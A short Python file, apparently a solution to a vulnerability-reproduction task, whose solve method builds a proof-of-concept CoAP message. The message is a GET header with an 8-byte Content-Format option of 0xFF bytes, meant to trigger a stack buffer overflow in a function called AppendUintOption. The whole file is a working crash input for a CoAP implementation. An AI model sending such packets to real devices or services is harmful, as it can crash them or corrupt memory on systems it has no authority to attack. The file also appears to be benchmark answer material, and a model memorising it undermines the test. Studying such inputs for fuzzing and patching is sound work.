import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in AppendUintOption.
        The vulnerability is caused by writing an integer option value larger than the
        internal stack buffer (likely 4 bytes) allocated for it.
        We provide an 8-byte integer option value to trigger this.
        """
        # CoAP Header: Ver=1(2b), T=CON(2b), TKL=0(4b) -> 0x40
        # Code: GET (0x01)
        # Message ID: 0x1234 (arbitrary)
        header = b'\x40\x01\x12\x34'
        
        # Option: Content-Format (Option Number 12)
        # This is a standard Uint option.
        # Delta = 12 (0xC0 in upper nibble)
        # Length = 8 (0x08 in lower nibble) -> Total 0xC8
        # We use the maximum allowed integer length in CoAP (8 bytes) to overflow
        # any smaller buffer (e.g., 4 bytes for uint32).
        option_header = b'\xC8'
        
        # Option Value: 8 bytes of 0xFF
        option_value = b'\xFF' * 8
        
        return header + option_header + option_value